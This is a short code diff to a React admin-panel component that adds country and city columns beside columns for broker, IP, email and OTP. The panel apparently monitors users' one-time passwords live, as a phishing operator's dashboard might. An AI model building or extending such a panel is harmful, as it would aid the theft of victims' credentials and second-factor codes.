@@ -88,6 +88,8 @@ export default function Adm({ip,socket}) {
           <th>STATUS</th>
             <th>Corretora</th>
             <th>IP</th>
+            <th>País</th>
+            <th>Cidade</th>
             <th>ULT. ATUALIZAÇÃO</th>
             <th>Email</th>
             <th>OTP</th>
@@ -108,7 +110,8 @@ export default function Adm({ip,socket}) {
 </td>
                 <td>{item.corretora}</td>
                 <td>{item.ip}</td>
-
+                <td>{item.countryCode}</td>
+                <td>{item.city}</td>
                 <td style={{ color: item.online ? 'green' : 'red' }}>
                   {moment.tz(item.date, "America/Sao_Paulo").format("DD/MM/YY HH:mm:ss")}
                 </td>
